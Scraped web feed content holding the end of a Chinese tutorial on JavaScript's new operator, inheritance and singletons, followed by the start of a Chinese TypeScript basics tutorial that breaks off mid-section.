  }

  <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' 汪汪叫'</span>);
  }
}
</code></pre>
<h4 data-id="heading-13">ES6 继承的本质</h4>
<p>ES6 通过 <code>extends</code> 关键字实现继承，就等价于 ES5 的寄生组合继承：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AnimalES5</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">AnimalES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' 叫了'</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">DogES5</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-title class_">AnimalES5</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
}

<span class="hljs-comment">// 设置原型链</span>
<span class="hljs-title class_">DogES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">AnimalES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">DogES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">DogES5</span>;

<span class="hljs-title class_">DogES5</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">speak</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> + <span class="hljs-string">' 汪汪叫'</span>);
};
</code></pre>
<h2 data-id="heading-14">特殊场景与高级应用</h2>
<h3 data-id="heading-15">单例模式与 new</h3>
<h4 data-id="heading-16">方法1：使用静态属性</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonV1</span> {
  <span class="hljs-keyword">static</span> instance = <span class="hljs-literal">null</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">SingletonV1</span>.<span class="hljs-property">instance</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">SingletonV1</span>.<span class="hljs-property">instance</span>;
    }

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-title class_">SingletonV1</span>.<span class="hljs-property">instance</span> = <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getInstance</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">instance</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SingletonV1</span>(name);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">instance</span>;
  }
}
</code></pre>
<h4 data-id="heading-17">方法2：使用闭包</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">SingletonV2</span> = (<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> instance = <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
      <span class="hljs-keyword">if</span> (instance) {
        <span class="hljs-keyword">return</span> instance;
      }

      <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
      instance = <span class="hljs-variable language_">this</span>;
    }
  };
})();
</code></pre>
<h4 data-id="heading-18">方法3：代理模式</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createSingletonProxy</span>(<span class="hljs-params">Class</span>) {
  <span class="hljs-keyword">let</span> instance = <span class="hljs-literal">null</span>;

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(<span class="hljs-title class_">Class</span>, {
    <span class="hljs-title function_">construct</span>(<span class="hljs-params">target, args</span>) {
      <span class="hljs-keyword">if</span> (!instance) {
        instance = <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">construct</span>(target, args);
      }
      <span class="hljs-keyword">return</span> instance;
    }
  });
}
</code></pre>
<h3 data-id="heading-19">实现 Object.create 的 polyfill</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property">create</span> !== <span class="hljs-string">'function'</span>) {
  <span class="hljs-title class_">Object</span>.<span class="hljs-property">create</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">proto, propertiesObject</span>) {
    <span class="hljs-comment">// 参数验证</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">'object'</span> &amp;&amp; <span class="hljs-keyword">typeof</span> proto !== <span class="hljs-string">'function'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Object prototype may only be an Object or null'</span>);
    }

    <span class="hljs-comment">// 核心实现：使用空函数作为中间构造函数</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params"/>) { }
    F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = proto;

    <span class="hljs-comment">// 创建新对象，原型指向proto</span>
    <span class="hljs-keyword">const</span> obj = <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>();

    <span class="hljs-comment">// 处理第二个参数（属性描述符）</span>
    <span class="hljs-keyword">if</span> (propertiesObject !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperties</span>(obj, propertiesObject);
    }

    <span class="hljs-comment">// 处理 null 原型</span>
    <span class="hljs-keyword">if</span> (proto === <span class="hljs-literal">null</span>) {
      obj.<span class="hljs-property">__proto__</span> = <span class="hljs-literal">null</span>;
    }
    <span class="hljs-comment">// 返回新对象</span>
    <span class="hljs-keyword">return</span> obj;
  };
}
</code></pre>
<h2 data-id="heading-20">常见面试问题与解答</h2>
<h3 data-id="heading-21">问题1：new 操作符做了什么？</h3>
<ol>
<li>创建一个新的空对象',</li>
<li>将这个空对象的原型设置为构造函数的 prototype 属性',</li>
<li>将构造函数的 this 绑定到这个新对象，并执行构造函数',</li>
<li>如果构造函数返回一个对象（包括函数），则返回该对象；否则返回新创建的对象</li>
</ol>
<h3 data-id="heading-22">问题2：如果构造函数有返回值会怎样？</h3>
<ul>
<li>返回对象（包括函数）：忽略 this 绑定的对象，返回该对象</li>
<li>返回原始值（number, string, boolean等）：忽略返回值，返回 this 绑定的对象</li>
<li>没有 return 语句：隐式返回 undefined，返回 this 绑定的对象</li>
</ul>
<h3 data-id="heading-23">问题3：如何判断函数是否被 new 调用？</h3>
<ul>
<li>ES5：检查 this instanceof Constructor'</li>
<li>ES6+：使用 new.target（更准确）</li>
<li>箭头函数：不能作为构造函数，没有 new.target</li>
</ul>
<h2 data-id="heading-24">结语</h2>
<p>通过深入理解 new 操作符的工作原理，我们不仅能在面试中脱颖而出，还能在实际开发中做出更明智的设计决策。对于文章中错误的地方或者有任何问题，欢迎在评论区留言讨论！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript 核心基础知识]]></title>    <link>https://juejin.cn/post/7605539194690666496</link>    <guid>https://juejin.cn/post/7605539194690666496</guid>    <pubDate>2026-02-13T01:11:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605539194690666496" data-draft-id="7605772919224320034" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript 核心基础知识"/> <meta itemprop="keywords" content="前端,TypeScript,面试"/> <meta itemprop="datePublished" content="2026-02-13T01:11:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不想秃头的程序员"/> <meta itemprop="url" content="https://juejin.cn/user/2754702534251820"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript 核心基础知识
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2754702534251820/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不想秃头的程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T01:11:10.000Z" title="Fri Feb 13 2026 01:11:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>TypeScript（简称 TS）作为 JavaScript 的超集，已成为前端工程化的标配。它通过静态类型检查，提前规避大量运行时错误，让代码更易维护、更具可读性。本文抛开复杂概念，从新手视角梳理 TS 核心基础知识，看完就能上手写 TS 代码。</p>
<h2 data-id="heading-0">一、为什么要学 TypeScript？</h2>
<p>先明确学习的意义，避免盲目跟风：</p>
<ol>
<li><strong>静态类型检查</strong>：编码阶段发现错误（如类型不匹配、属性不存在），而非运行时崩溃；</li>
<li><strong>更好的代码提示</strong>：VS Code 等编辑器能精准提示变量 / 函数的属性和方法，提升开发效率；</li>
<li><strong>代码可读性提升</strong>：类型注解就是 “自文档”，一眼看懂变量 / 函数的用途；</li>
<li><strong>工程化必备</strong>：Vue3、React、Node.js 主流框架 / 环境均推荐 / 支持 TS，大厂项目标配。</li>
</ol>
<h2 data-id="heading-1">二、TS 环境搭建（快速上手）</h2>
<h3 data-id="heading-2">1. 安装 TypeScript</h3>
<pre><code class="hljs language-js" lang="js"># 全局安装 <span class="hljs-variable constant_">TS</span> 编译器
npm install -g typescript
# 验证安装（查看版本）
tsc -v
</code></pre>
<h3 data-id="heading-3">2. 第一个 TS 程序</h3>
<ul>
<li>
<p>创建 <code>hello.ts</code> 文件：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 类型注解：指定变量类型为字符串</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">message</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">"Hello TypeScript!"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);
</code></pre>
</li>
<li>
<p>编译 TS 为 JS：</p>
<pre><code class="hljs language-ts" lang="ts"># 将 hello.<span class="hljs-property">ts</span> 编译为 hello.<span class="hljs-property">js</span>
tsc hello.<span class="hljs-property">ts</span>
</code></pre>
</li>
<li>
<p>运行 JS 文件：</p>
<pre><code class="hljs language-ts" lang="ts">node hello.<span class="hljs-property">js</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-4">3. 简化开发：自动编译 + 热更新（可选）</h3>
<pre><code class="hljs language-ts" lang="ts"># 安装 ts-node（直接运行 <span class="hljs-variable constant_">TS</span>，无需手动编译）
npm install -g ts-node
# 直接运行 <span class="hljs-variable constant_">TS</span> 文件
ts-node hello.<span class="hljs-property">ts</span>
</code></pre>
<h2 data-id="heading-5">三、核心基础：类型注解与类型推断</h2>
<h3 data-id="heading-6">1. 类型注解（手动指定类型）</h3>
<p>语法：<code>变量名: 类型 = 值</code>，告诉 TS 变量的具体类型。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基本类型注解</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">"张三"</span>; <span class="hljs-comment">// 字符串</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">25</span>; <span class="hljs-comment">// 数字（整数/浮点数/NaN/Infinity）</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">isAdult</span>: <span class="hljs-built_in">boolean</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 布尔值</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">empty</span>: <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// null</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">undef</span>: <span class="hljs-literal">undefined</span> = <span class="hljs-literal">undefined</span>; <span class="hljs-comment">// undefined</span>

<span class="hljs-comment">// 数组注解（两种写法）</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr1</span>: <span class="hljs-built_in">string</span>[] = [<span class="hljs-string">"苹果"</span>, <span class="hljs-string">"香蕉"</span>]; <span class="hljs-comment">// 推荐</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">arr2</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">number</span>&gt; = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]; <span class="hljs-comment">// 泛型写法</span>

<span class="hljs-comment">// 对象注解</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">user</span>: { <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span> } = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"李四"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>,
};

<span class="hljs-comment">// 函数注解（参数 + 返回值）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}
</code></pre>
<h3 data-id="heading-7">2. 类型推断（TS 自动推导类型）</h3>
<p>TS 会根据变量的初始值自动推断类型，无需手动注解（日常开发中优先用推断，减少冗余）。</p>
<p>typescript</p>
<p>运行</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> str = <span class="hljs-string">"hello"</span>; <span class="hljs-comment">// TS 自动推断 str 为 string 类型</span>
str = <span class="hljs-number">123</span>; <span class="hljs-comment">// 报错：不能将类型“number”分配给类型“string”</span>

<span class="hljs-keyword">let</span> num = <span class="hljs-number">100</span>; <span class="hljs-comment">// 推断为 number 类型</span>
<span class="hljs-keyword">let</span> bool = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 推断为 boolean 类型</span>
</code></pre>
<p><strong>核心原则</strong>：能靠推断的就不手动注解，需要明确约束时才加注解。</p>
<h2 data-id="heading-8">四、常用基础类型</h2>
<h3 data-id="heading-9">1. 原始类型</h3>
<p>表格</p>













































<table><thead><tr><th>类型</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td><code>string</code></td><td>字符串</td><td><code>let str: string = "TS"</code></td></tr><tr><td><code>number</code></td><td>数字</td><td><code>let num: number = 666</code></td></tr><tr><td><code>boolean</code></td><td>布尔值</td><td><code>let flag: boolean = false</code></td></tr><tr><td><code>null</code></td><td>空值</td><td><code>let n: null = null</code></td></tr><tr><td><code>undefined</code></td><td>未定义</td><td><code>let u: undefined = undefined</code></td></tr><tr><td><code>symbol</code></td><td>唯一值</td><td><code>let s: symbol = Symbol("id")</code></td></tr><tr><td><code>bigint</code></td><td>大整数</td><td><code>let b: bigint = 100n</code></td></tr></tbody></table>
<h3 data-id="heading-10">2. 数组</h3>
<p>两种写法，推荐第一种：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 写法1：类型[]</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">numbers</span>: <span class="hljs-built_in">number</span>[] = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-comment">// 写法2：Array&lt;类型&gt;</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">strings</span>: <span class="hljs-title class_">Array</span>&lt;<span class="hljs-built_in">string</span>&gt; = [<span class="hljs-string">"a"</span>, <span class="hljs-string">"b"</span>];
<span class="hljs-comment">// 禁止混合类型（除非指定联合类型）</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">mix</span>: (<span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span>)[] = [<span class="hljs-number">1</span>, <span class="hljs-string">"a"</span>]; <span class="hljs-comment">// 联合类型：字符串或数字</span>
</code></pre>
<h3 data-id="heading-11">3. 元组（Tuple）</h3>
<p>固定长度、固定类型的数组（强约束）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 元组注解：第一个元素是string，第二个是number</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">tuple</span>: [<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>] = [<span class="hljs-string">"张三"</span>, <span class="hljs-number">25</span>];
tuple[<span class="hljs-number">0</span>] = <span class="hljs-string">"李四"</span>; <span class="hljs-comment">// 合法</span>
tuple[<span class="hljs-number">1</span>] = <span class="hljs-number">30</span>; <span class="hljs-comment">// 合法</span>
tuple.<span class="hljs-title function_">push</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// 注意：push 不会报错（TS 设计缺陷），但访问 tuple[2] 会报错</span>
</code></pre>
<h3 data-id="heading-12">4. 任意类型（any）</h3>
<p>关闭 TS 类型检查，慎用（失去 TS 核心价值）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">anyValue</span>: <span class="hljs-built_in">any</span> = <span class="hljs-string">"hello"</span>;
anyValue = <span class="hljs-number">123</span>; <span class="hljs-comment">// 不报错</span>
anyValue = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 不报错</span>
anyValue.<span class="hljs-title function_">foo</span>(); <span class="hljs-comment">// 不报错（运行时可能崩溃）</span>
</code></pre>
<h3 data-id="heading-13">5. 未知类型（unknown）</h3>
<p>安全版 <code>any</code>，必须先类型校验才能使用：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">let</span> <span class="hljs-attr">unknownValue</span>: <span class="hljs-built_in">unknown</span> = <span class="hljs-string">"hello"</span>;
<span class="hljs-comment">// unknownValue.toUpperCase(); // 报错：不能直接调用方法</span>

<span class="hljs-comment">// 先校验类型，再使用</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> unknownValue === <span class="hljs-string">"string"</span>) {
  unknownValue.<span class="hljs-title function_">toUpperCase</span>(); <span class="hljs-comment">// 合法</span>
}
</code></pre>
<h3 data-id="heading-14">6. 空类型（void）</h3>
<p>表示函数没有返回值（或返回 <code>undefined</code>）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logMsg</span>(<span class="hljs-params"/>): <span class="hljs-built_in">void</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"这是一个无返回值的函数"</span>);
  <span class="hljs-comment">// 省略 return 或 return undefined 均合法</span>
}
</code></pre>
<h3 data-id="heading-15">7. 永不类型（never）</h3>
<p>表示永远不会发生的值（如抛出错误、无限循环）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 抛出错误的函数，返回值为 never</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">throwError</span>(<span class="hljs-params"/>): <span class="hljs-built_in">never</span> {
  <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"出错了！"</span>);
}

<span class="hljs-comment">// 无限循环的函数，返回值为 never</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">infiniteLoop</span>(<span class="hljs-params"/>): <span class="hljs-built_in">never</span> {
  <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {}
}
</code></pre>
<h2 data-id="heading-16">五、进阶基础：接口与类型别名</h2>
<h3 data-id="heading-17">1. 接口（interface）</h3>
<p>用于约束对象的结构，可扩展、可实现，是 TS 中定义对象类型的核心方式：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 定义接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 必选属性</span>
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 必选属性</span>
  gender?: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 可选属性（加 ?）</span>
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>; <span class="hljs-comment">// 只读属性（不可修改）</span>
}

<span class="hljs-comment">// 使用接口约束对象</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,
  <span class="hljs-attr">id</span>: <span class="hljs-number">1001</span>,
  <span class="hljs-comment">// gender 可选，可省略</span>
};

user.<span class="hljs-property">id</span> = <span class="hljs-number">1002</span>; <span class="hljs-comment">// 报错：只读属性不能修改</span>
</code></pre>
<h3 data-id="heading-18">2. 类型别名（type）</h3>
<p>给类型起别名，适用范围更广（可约束任意类型，不止对象）：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基本类型别名</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Str</span> = <span class="hljs-built_in">string</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">str</span>: <span class="hljs-title class_">Str</span> = <span class="hljs-string">"hello"</span>;

<span class="hljs-comment">// 对象类型别名</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">User</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
};

<span class="hljs-comment">// 联合类型别名</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberOrString</span> = <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>;
<span class="hljs-keyword">let</span> <span class="hljs-attr">value</span>: <span class="hljs-title class_">NumberOrString</span> = <span class="hljs-number">100</span>;
value = <span class="hljs-string">"abc"</span>;
</code></pre>
<h3 data-id="heading-19">3. interface vs type 核心区别</h3>
<p>表格</p>

























<table><thead><tr><th>特性</th><th>interface</th><th>type</th></tr></thead><tbody><tr><td>扩展</td><td>可通过 <code>extends</code> 扩展</td><td>可通过 <code>&amp;</code> 交叉扩展</td></tr><tr><td>重复定义</td><td>支持（自动合并）</td><td>不支持（会报错）</td></tr><tr><td>适用范围</td><td>主要约束对象 / 类</td><td>可约束任意类型（基本类型、联合类型等）</td></tr></tbody></table>
<p><strong>使用建议</strong>：定义对象 / 类的结构用 <code>interface</code>，其他场景用 <code>type</code>。</p>
<h2 data-id="heading-20">六、函数相关类型</h2>
<h3 data-id="heading-21">1. 函数参数与返回值注解</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 普通函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-comment">// 箭头函数</span>
